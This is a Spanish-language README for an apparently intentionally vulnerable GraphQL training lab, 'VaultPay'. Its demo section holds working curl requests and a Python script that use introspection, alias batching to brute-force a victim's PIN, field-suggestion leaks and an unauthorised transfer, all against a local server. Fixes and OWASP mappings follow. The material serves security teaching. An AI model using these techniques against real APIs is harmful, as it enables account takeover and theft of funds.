# VaultPay — Vulnerable GraphQL Lab

> Lab educativo de seguridad en APIs GraphQL  
> Creado por **Elisa Elias** — [@Cinn4mor0ll](https://www.instagram.com/elisa_elias__/))

---

## Descripcion

VaultPay es una billetera digital ficticia B2C construida con Node.js y Apollo Server, disenada para demostrar una cadena de ataque completa contra APIs GraphQL mal configuradas en produccion.

El lab demuestra como un atacante externo, partiendo de cero y sin conocimiento previo de la plataforma, puede comprometer la cuenta de otra persona y realizar transferencias no autorizadas encadenando cuatro vulnerabilidades reales.

---

## Que es GraphQL y por que importa en seguridad

GraphQL es un lenguaje de consulta para APIs desarrollado por Meta en 2012 y liberado como open source en 2015. A diferencia de REST, donde cada recurso tiene su propia URL, GraphQL expone un unico endpoint desde el cual el cliente decide exactamente que datos quiere recibir.

```
REST:                          GraphQL:
  GET /users                     POST /graphql
  GET /transfers                 (un solo endpoint para todo)
  POST /login
  POST /send-money
```

Esta flexibilidad lo hace muy popular en startups y empresas modernas. El problema es que viene con features que, activadas por defecto en desarrollo, se convierten en vulnerabilidades criticas cuando llegan a produccion sin revision.

### Conceptos clave

**Query**: operacion de lectura, equivalente a GET en REST  
**Mutation**: operacion de escritura, equivalente a POST/PUT/DELETE en REST  
**Schema**: definicion de todos los tipos, queries y mutations disponibles  
**Introspection**: mecanismo que permite consultar el schema completo de la API  
**Aliases**: permite ejecutar la misma operacion multiples veces con nombres distintos en una sola request  

### Por que GraphQL es vulnerable

GraphQL no es inseguro por naturaleza. Es inseguro cuando los equipos despliegan a produccion con configuraciones por defecto de desarrollo.

| Configuracion | En desarrollo | En produccion |
|---|---|---|
| `introspection: true` | Util para explorar la API | Expone todo el schema al atacante |
| Sin limite de complejidad | Las queries funcionan sin restriccion | Permite batch attacks con miles de operaciones |
| Field suggestions activas | Ayuda al developer a corregir typos | Expone campos internos ocultos |
| Mensajes de error detallados | Facilita el debugging | Filtra informacion sensible |

---

## Vulnerabilidades demostradas

| # | Vulnerabilidad | OWASP | Impacto |
|---|---|---|---|
| 1 | GraphQL Introspection en produccion | API8:2023 | Schema completo expuesto, endpoints ocultos descubiertos |
| 2 | Batch Attack sin rate limiting por operacion | API4:2023 | 10,000 intentos de PIN en 1 request HTTP |
| 3 | Field Suggestion Attack | API3:2023 | Campos internos ocultos expuestos via mensajes de error |
| 4 | Information Disclosure en resetPassword | API3:2023 | Hint de seguridad y telefono parcial filtrados |

---

## Cadena de ataque

```
[0] Registro legitimo
    Cuenta creada sin credenciales previas
         |
[1] Busqueda de victima
    Email publico → buscarUsuario → ID interno de la victima
         |
[2] Introspection
    Schema expuesto → mutation verifyPin descubierta (sin rate limiting)
         |
[3] Batch PIN Brute Force
    10,000 aliases en 1 request HTTP
    Rate limiting bypasseado → PIN crackeado → token_confirmacion
         |
[4] Field Suggestion Attack
    Typos deliberados → servidor sugiere campos reales
    fraudFlag, internalScore, adminNotes, CURP, telefono exfiltrados
         |
[5] Information Disclosure
    resetPassword → hint de seguridad + telefono parcial
         |
[6] Transferencia no autorizada
    token_confirmacion del PIN crackeado → dinero transferido
```

---

## Stack

```
Backend  : Node.js + Apollo Server 4 + nedb (in-memory)
Frontend : HTML + CSS + JavaScript vanilla
Auth     : JWT
Passwords: bcryptjs
Puerto   : 4000
```

---

## Inicializar el lab

### Manual

```bash
cd vaultpay-lab/backend
npm install
node server.js
```

Abrir `frontend/index.html` en el browser.  
GraphQL Playground: `http://localhost:4000/graphql`

### Docker

```bash
docker-compose up
```

Frontend: `http://localhost:8080`  
API: `http://localhost:4000/graphql`

### Resetear la DB

La DB es in-memory. Para resetear a los datos seed originales:

```bash
pkill -f "node server"
node server.js
```

---

## Usuarios seed

| Nombre | Email | Password | PIN | Saldo |
|---|---|---|---|---|
| Carlos Mendoza Vega | c.mendoza@gmail.com | Mendoza2026! | 4821 | $12,450 |
| Sofia Herrera Leal | s.herrera@outlook.com | Herrera2026! | 7364 | $3,820 |
| Miguel Torres Ruiz | m.torres@proton.me | Torres2026! | 1593 | $28,900 |
| Ana Gutierrez Flores | ana.gutierrez@empresa.mx | Gutierrez2026! | 2048 | $7,650 |

---

## Demo manual

### Registro y busqueda de victima

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { registro(nombre: \"Atacante\", email: \"atacante@evil.com\", password: \"Pass2026!\", telefono: \"5512345678\", curp: \"ATKA990101MDFRRN01\") { token usuario { id } } }"}' \
  | python3 -m json.tool

export TOKEN="JWT_DE_LA_RESPUESTA"

curl -s -X POST http://localhost:4000/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ buscarUsuario(email: \"s.herrera@outlook.com\") { id nombre email } }"}' \
  | python3 -m json.tool
```

### Introspection

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name args { name } } } } }"}' \
  | python3 -m json.tool
```

### Batch PIN Brute Force

```python
import requests

BASE  = "http://localhost:4000/graphql"
TOKEN = "TU_TOKEN"
USER  = "usr-vp-002"

pines = [str(i).zfill(4) for i in range(7300, 7400)]
ops   = "\n".join([
    f'p{pin}: verifyPin(userId: "{USER}", pin: "{pin}") {{ exitoso token_confirmacion }}'
    for pin in pines
])

print(f"[*] Enviando {len(pines)} intentos en 1 sola request HTTP...")
r = requests.post(BASE,
    json={"query": f"mutation {{ {ops} }}"},
    headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"},
    timeout=60
)
for key, val in r.json().get("data", {}).items():
    pin = key.replace("p", "")
    if val and val.get("exitoso"):
        print(f"[+] PIN ENCONTRADO: {pin}")
        print(f"[+] Token: {val['token_confirmacion']}")
        break
    else:
        print(f"[-] PIN {pin} incorrecto")
```

### Field Suggestion Attack

```bash
# Query con typos
curl -s -X POST http://localhost:4000/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ perfilDetallado(userId: \"usr-vp-002\") { nombre fraud internalScor adminNote } }"}' \
  | python3 -m json.tool

# Query con campos reales descubiertos
curl -s -X POST http://localhost:4000/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ perfilDetallado(userId: \"usr-vp-002\") { nombre email curp telefono fraudFlag internalScore adminNotes } }"}' \
  | python3 -m json.tool
```

### Information Disclosure

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { resetPassword(email: \"s.herrera@outlook.com\") { existe hint telefono_parcial } }"}' \
  | python3 -m json.tool
```

### Transferencia no autorizada

```bash
export PIN_TOKEN="JWT_TOKEN_CONFIRMACION"

curl -s -X POST http://localhost:4000/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"mutation { iniciarTransferencia(receptorEmail: \\\"atacante@evil.com\\\", monto: 1000, concepto: \\\"Transferencia\\\", pinToken: \\\"$PIN_TOKEN\\\") { id monto estado referencia } }\"}" \
  | python3 -m json.tool
```

---

## Fixes

### Deshabilitar introspection en produccion

```javascript
const server = new ApolloServer({
  introspection: process.env.NODE_ENV !== 'production'
});
```

### Rate limiting por operacion GraphQL

```javascript
const { createComplexityLimitRule } = require('graphql-validation-complexity');
const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
  validationRules: [
    depthLimit(5),
    createComplexityLimitRule(1000)
  ]
});
```

### Deshabilitar field suggestions

```javascript
const { ApolloServerPluginDisableSuggestions } = require('@apollo/server/plugin/disableSuggestions');

const server = new ApolloServer({
  plugins: [ApolloServerPluginDisableSuggestions()]
});
```

### resetPassword sin information disclosure

```javascript
resetPassword: async (_, { email }) => {
  return {
    mensaje: 'Si el correo existe, recibiras instrucciones en tu bandeja de entrada.'
  };
}
```

---

## Mappings

```
OWASP API Security  →  API3:2023 Excessive Data Exposure
                        API4:2023 Unrestricted Resource Consumption
                        API8:2023 Security Misconfiguration
CWE                 →  CWE-200 Exposure of Sensitive Information
                        CWE-307 Improper Restriction of Excessive Auth Attempts
MITRE ATT&CK        →  T1078 Valid Accounts
                        T1110.001 Brute Force: Password Guessing
                        T1087 Account Discovery
                        T1213 Data from Information Repositories
```

---

## Herramientas para la demo

- **InQL** — Extension de Burp Suite para analizar APIs GraphQL. Automatiza la introspection y genera un arbol visual del schema. Disponible en el BApp Store de Burp.
- **Burp Suite** — Proxy para interceptar y modificar requests.
- **curl** — Queries GraphQL desde terminal.
- **Python requests** — Batch attack automatizado.

---

## Estructura

```
vaultpay-lab/
├── backend/
│   ├── server.js
│   ├── package.json
│   └── Dockerfile
├── frontend/
│   └── index.html
├── attack.py
├── docker-compose.yml
├── .gitignore
└── README.md
```

---

> Lab creado con fines estrictamente educativos. No usar contra sistemas reales.

*Elisa Elias — Cinn4mor0ll | [YouTube](https://www.youtube.com/@Elisa_Elias) | [GitHub](https://github.com/Elisaelias02)*
